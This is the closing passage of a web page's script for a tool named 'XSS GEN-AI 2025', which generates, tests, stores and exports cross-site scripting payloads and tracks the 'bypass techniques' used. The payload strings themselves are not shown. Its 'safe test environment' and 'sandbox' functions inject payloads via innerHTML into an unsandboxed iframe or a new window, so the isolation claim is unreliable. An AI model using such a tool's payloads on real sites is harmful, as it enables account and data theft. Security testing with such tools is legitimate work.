                        showNotification('Copied to clipboard!');
                    });
            };
            
            // Update last bypass
            document.getElementById('lastBypass').textContent = 
                payloadObj.techniques.join(', ');
        }
        
        function addToHistory(payloadObj) {
            generatedPayloads.unshift(payloadObj);
            if (generatedPayloads.length > 20) {
                generatedPayloads.pop();
            }
            
            uniquePatterns.add(payloadObj.type);
            
            const historySection = document.getElementById('historySection');
            const historyItem = document.createElement('div');
            historyItem.className = 'history-item';
            historyItem.innerHTML = `
                <div style="color: var(--cyber-blue); margin-bottom: 5px;">
                    <i class="fas fa-${getIconForType(payloadObj.type)}"></i>
                    ${payloadObj.type}
                    <span style="float: right; font-size: 0.8em; color: var(--matrix-green);">
                        ${new Date(payloadObj.timestamp).toLocaleTimeString()}
                    </span>
                </div>
                <div style="font-size: 0.85em; opacity: 0.8; overflow: hidden; text-overflow: ellipsis;">
                    ${payloadObj.content.substring(0, 100)}${payloadObj.content.length > 100 ? '...' : ''}
                </div>
            `;
            
            historyItem.onclick = () => {
                displayPayload(payloadObj);
                showNotification('Loaded from history');
            };
            
            historySection.insertBefore(historyItem, historySection.firstChild);
        }
        
        function getIconForType(type) {
            const icons = {
                'HTML': 'code',
                'JavaScript': 'js',
                'SVG': 'image',
                'Iframe': 'window-maximize',
                'PostMessage': 'network-wired',
                'DataURI': 'link',
                'Blob': 'file',
                'Template': 'magic',
                'DOM': 'sitemap',
                'Prototype': 'dna'
            };
            
            return icons[type] || 'code';
        }
        
        function testPayload(payloadObj) {
            // Create a safe test environment
            const testFrame = document.createElement('iframe');
            testFrame.style.cssText = `
                position: fixed;
                top: -9999px;
                left: -9999px;
                width: 1px;
                height: 1px;
                border: none;
                opacity: 0;
            `;
            
            testFrame.srcdoc = `
                <!DOCTYPE html>
                <html>
                <head>
                    <meta charset="UTF-8">
                    <title>Test Sandbox</title>
                </head>
                <body>
                    <div id="testArea"></div>
                    <script>
                        try {
                            document.getElementById('testArea').innerHTML = ${JSON.stringify(payloadObj.content)};
                            window.parent.postMessage({type: 'testResult', success: true}, '*');
                        } catch(e) {
                            window.parent.postMessage({type: 'testResult', success: false, error: e.message}, '*');
                        }
                    <\\/script>
                </body>
                </html>
            `;
            
            document.body.appendChild(testFrame);
            
            window.addEventListener('message', function handler(e) {
                if (e.data.type === 'testResult') {
                    generationStats.total++;
                    if (e.data.success) {
                        generationStats.successfulTests++;
                        uniquePatterns.add(payloadObj.type);
                    }
                    updateStats();
                    document.body.removeChild(testFrame);
                    window.removeEventListener('message', handler);
                }
            });
            
            setTimeout(() => {
                if (testFrame.parentNode) {
                    document.body.removeChild(testFrame);
                }
            }, 3000);
        }
        
        function updateStats() {
            document.getElementById('totalGenerated').textContent = generationStats.total;
            document.getElementById('uniquePatterns').textContent = uniquePatterns.size;
            
            const successRate = generationStats.total > 0 ? 
                Math.round((generationStats.successfulTests / generationStats.total) * 100) : 0;
            document.getElementById('successRate').textContent = `${successRate}%`;
        }
        
        function generateBatch() {
            showNotification('Generating 10 unique payloads...');
            
            for (let i = 0; i < 10; i++) {
                setTimeout(() => {
                    generatePayload();
                }, i * 300);
            }
        }
        
        function testInSandbox() {
            const payload = document.getElementById('payloadOutput').textContent;
            
            const sandbox = window.open('', '_blank');
            if (sandbox) {
                sandbox.document.write(`
                    <!DOCTYPE html>
                    <html>
                    <head>
                        <title>XSS Sandbox Test</title>
                        <style>
                            body { 
                                font-family: monospace; 
                                background: #000; 
                                color: #0f0; 
                                padding: 20px;
                            }
                            #output {
                                border: 2px solid #0f0;
                                padding: 20px;
                                margin: 20px 0;
                                min-height: 200px;
                            }
                        </style>
                    </head>
                    <body>
                        <h1>🔒 XSS SANDBOX TEST</h1>
                        <p>Testing payload execution in isolated environment</p>
                        <div id="output"></div>
                        <button onclick="runTest()">Execute Test</button>
                        <button onclick="window.close()">Close</button>
                        <script>
                            function runTest() {
                                try {
                                    document.getElementById('output').innerHTML = \`${payload.replace(/`/g, '\\`')}\`;
                                    console.log('Test executed successfully');
                                } catch(e) {
                                    document.getElementById('output').innerHTML = '❌ Error: ' + e.message;
                                }
                            }
                        <\\/script>
                    </body>
                    </html>
                `);
                sandbox.document.close();
            }
        }
        
        function exportPayloads() {
            const exportData = {
                metadata: {
                    generator: "XSS GEN-AI 2025",
                    version: "2.0.1",
                    exportDate: new Date().toISOString(),
                    totalPayloads: generatedPayloads.length
                },
                config: getConfig(),
                payloads: generatedPayloads,
                stats: generationStats
            };
            
            const blob = new Blob([JSON.stringify(exportData, null, 2)], 
                { type: 'application/json' });
            const url = URL.createObjectURL(blob);
            
            const a = document.createElement('a');
            a.href = url;
            a.download = `xss-payloads-${Date.now()}.json`;
            document.body.appendChild(a);
            a.click();
            document.body.removeChild(a);
            URL.revokeObjectURL(url);
            
            showNotification('Payloads exported successfully!');
        }
        
        function showNotification(message, type = 'success') {
            const notification = document.getElementById('notification');
            notification.textContent = message;
            notification.className = `notification ${type}`;
            notification.classList.add('show');
            
            setTimeout(() => {
                notification.classList.remove('show');
            }, 3000);
        }
    </script>
</body>
</html>